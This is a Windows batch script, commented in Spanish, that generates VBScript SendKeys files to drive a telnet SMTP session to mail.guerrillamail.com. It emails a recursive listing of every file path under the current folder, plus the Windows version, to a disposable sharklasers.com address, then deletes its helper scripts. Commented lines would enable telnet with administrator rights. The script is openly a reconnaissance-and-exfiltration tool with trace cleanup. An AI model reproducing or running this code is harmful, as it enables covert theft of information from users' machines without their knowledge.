::------------------------------------------------------------------------------------------------------------------SCRIPT (ENTER) FOR AUTORUN
@echo set OBJECT=WScript.CreateObject("WScript.Shell") >> key_enter.vbs
@echo WScript.sleep 50 >> key_enter.vbs
@echo OBJECT.SendKeys "{ENTER}"  >> key_enter.vbs




:://////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    :: Run the script enter
    cscript key_enter.vbs 

:://////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
::---------------------------------------------------------------------------------------------------------------ACTIVADOR DE TELNET PARA WINDOW 7/8/10

::@echo dism /online /Enable-Feature /FeatureName:TelnetClient>> acti.bat
::@echo pkgmgr /iu:”TelnetServer” >> acti.bat


::start acti.lnk HAY QUE HACER UN ACCESO DIRECTO (acti.lnk) QUE ABRA EL ACTIVADOR (acti.bat) CON PERMISO DE ADMINISTRADOR

:///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
::------------------------------------------------------------------------------------------SCRIPT TELNET/ SE CONECTA A GUERRILLAMAIL.COM VIA TELNET(MODIFICAR MAIL CADA VEZ)
@echo off

@echo set OBJECT=WScript.CreateObject("WScript.Shell") >>SendKeys.vbs
@echo WScript.sleep 50  >>SendKeys.vbs 
@echo OBJECT.SendKeys "HELO guerrillamai.com{ENTER}"  >>SendKeys.vbs
@echo WScript.sleep 50  >>SendKeys.vbs
@echo OBJECT.SendKeys "mail from: tbbwxgrc@sharklasers.com{ENTER}" >>SendKeys.vbs
@echo WScript.sleep 50  >>SendKeys.vbs
@echo OBJECT.SendKeys "rcpt to: tbbwxgrc@sharklasers.com{ENTER}"  >>SendKeys.vbs
@echo WScript.sleep 100  >>SendKeys.vbs
@echo OBJECT.SendKeys "data{ENTER}"  >>SendKeys.vbs
@echo WScript.sleep 100  >>SendKeys.vbs
@echo OBJECT.SendKeys "subject: prime{ENTER} {ENTER}"  >>SendKeys.vbs
@echo WScript.sleep 100  >>SendKeys.vbs




(for /F "delims=" %%G in ('dir /b /s') do (
    echo OBJECT.SendKeys "%%G .{ENTER}"
)
)>>SendKeys.vbs



@echo WScript.sleep 100  >>SendKeys.vbs
@echo OBJECT.SendKeys "subject test{ENTER} {ENTER}"  >>SendKeys.vbs
@echo WScript.sleep 100  >>SendKeys.vbs


(for /F "delims=" %%G in ('ver') do (
    echo OBJECT.SendKeys "%%G .{ENTER}"
)
)>>SendKeys.vbs

@echo OBJECT.SendKeys ".{ENTER} " >>SendKeys.vbs
@echo WScript.sleep 100  >>SendKeys.vbs
@echo OBJECT.SendKeys "{ENTER} " >>SendKeys.vbs
@echo WScript.sleep 50  >>SendKeys.vbs
@echo OBJECT.SendKeys "quit {ENTER}" >>SendKeys.vbs


::///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
::-------------------------------------------------------------------------------------------------------------SEND

  :: Open a Telnet window
   start telnet.exe mail.guerrillamail.com 25
   :: Run the script 
    cscript SendKeys.vbs 



 cscript key_enter.vbs 
:://////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
::-------------------------------------------------------------------------------------------------------------DELETE
del "temp.txt"
  ::del "SendKeys.vbs"
del "key_enter.vbs"
